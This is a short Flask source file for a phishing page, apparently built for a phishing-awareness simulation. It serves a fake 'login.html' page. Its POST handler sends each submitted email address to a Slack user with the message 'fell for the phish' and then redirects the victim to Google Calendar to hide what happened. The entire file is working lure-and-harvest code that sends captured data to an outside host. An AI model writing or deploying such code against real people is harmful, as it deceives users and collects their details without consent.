from flask import render_template, request, redirect
from decouple import config 
import slack

from app import app
    
SLACK_API_TOKEN = config('SLACK_API_TOKEN')
SLACK_USER = config('SLACK_USER')

client = slack.WebClient(SLACK_API_TOKEN)

@app.route('/')
def index():
    return render_template('login.html', title='Home')

@app.route('/handle_data', methods=['POST'])
def handle_data():
    client.chat_postMessage(channel=SLACK_USER, text=request.form['Email'] + " fell for  the phish.")
    return redirect("https://calendar.google.com", code=302)

